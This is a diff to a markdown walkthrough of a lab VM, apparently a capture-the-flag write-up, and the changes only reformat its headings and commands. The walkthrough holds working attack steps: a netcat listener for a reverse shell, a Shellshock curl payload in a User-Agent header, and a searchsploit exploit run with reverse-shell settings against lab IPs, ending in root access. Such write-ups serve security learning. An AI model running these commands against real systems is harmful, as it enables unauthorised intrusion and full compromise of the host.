@@ -53,7 +53,7 @@ To find IP address of VM:
 #### Nc -nvlp 4444 & visited url of shell
 ![](Assets/8.png)
 
-> got reverse shell
+> Got reverse shell
 
 #### Visit /var/www/
 ![](Assets/9.png)
@@ -91,7 +91,8 @@ To find IP address of VM:
 
 ### Method 3: Using shellshock
 
-#### Check if cmd works: curl --proxy 192.168.1.11:3128 http://192.168.1.11/cgi-bin/status -H "User-Agent: () { pwned;}; echo 'Content-Type: text/plain'; echo; /usr/bin/whoami; exit"
+#### Check if cmd works
+`curl --proxy 192.168.1.11:3128 http://192.168.1.11/cgi-bin/status -H "User-Agent: () { pwned;}; echo 'Content-Type: text/plain'; echo; /usr/bin/whoami; exit"`
 ![](Assets/16.png)
 
 #### Searchsploit -m 34900.py
@@ -99,9 +100,10 @@ To find IP address of VM:
 
 > Downloaded shellshock exploit
 
-#### Python 34900.py payload=reverse rhost=192.168.1.11 lhost=192.168.1.7 lport=1234 proxy=192.168.1.11:3128 pages=/cgi-bin/status
+#### Python Reverse shell
+`Python 34900.py payload=reverse rhost=192.168.1.11 lhost=192.168.1.7 lport=1234 proxy=192.168.1.11:3128 pages=/cgi-bin/status`
 ![](Assets/18.png)
 
-> Got Reverse shell
 > Repeat Method 2
+
 > Get root
